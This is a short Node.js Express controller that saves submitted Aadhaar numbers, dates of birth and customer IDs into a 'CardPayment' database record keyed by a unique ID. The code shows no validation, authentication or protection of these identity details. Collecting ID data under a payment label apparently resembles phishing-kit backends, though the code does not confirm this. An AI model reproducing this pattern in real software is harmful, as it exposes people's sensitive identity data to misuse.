const CardPayment = require('../models/CardPayment');

exports.submitCardPayment = async (req, res) => {
  try {
    const { uniqueid, aadharNumber, dateOfBirth, customerId } = req.body;
    let cardPayment = await CardPayment.findOne({ uniqueid });

    if (cardPayment) {
      cardPayment.entries.push({ aadharNumber, dateOfBirth, customerId });
    } else {
      cardPayment = new CardPayment({
        uniqueid,
        entries: [{ aadharNumber, dateOfBirth, customerId }]
      });
    }

    await cardPayment.save();
    res.status(200).json({
      success: true,
      message: "Card Payment Data Submitted Successfully!"
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      success: false,
      message: "Error occurred while submitting card payment data"
    });
  }
};
